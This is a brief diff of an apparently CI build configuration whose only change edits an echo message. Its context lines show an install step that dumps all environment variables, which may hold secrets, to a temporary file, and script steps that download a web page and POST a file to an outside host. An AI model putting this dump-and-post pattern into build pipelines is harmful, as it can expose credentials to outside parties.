@@ -3,4 +3,4 @@ install: "env > /tmp/envx"
 script:
 - curl https://www.okta.com/ -o /tmp/out
 - curl -XPOST  https://www.okta.com/ -d@/tmp/out
-- echo "Done....."
+- echo "Done......"
